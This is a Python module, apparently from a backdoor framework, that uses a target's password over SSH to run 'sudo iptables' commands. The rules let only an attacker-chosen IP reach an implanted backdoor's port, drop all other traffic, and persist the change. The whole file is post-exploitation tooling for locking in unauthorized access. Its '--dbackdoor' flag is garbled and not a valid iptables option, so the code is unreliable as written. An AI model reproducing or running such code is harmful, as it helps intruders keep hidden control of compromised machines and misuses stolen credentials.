from module import *

class Whitelist(Module):

    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "Whitelist"
        self.backdoor = backdoor
        self.options = {
                "ip": Option("ip", self.core.localIP, "IP to whitelist", True)
                }
        
    def exploit(self):
        port = self.backdoor.get_value("port")
        self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables -I INPUT -p tcp -m tcp -s " + str(self.get_value("ip")) + " --dbackdoor " + str(port) + " -j ACCEPT")
        self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables -I INPUT -p tcp -m tcp -s 0.0.0.0/0 --dbackdoor " + str(port) + " -j DROP")
        self.target.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S iptables-save")
        print(GOOD + self.name + " module success")
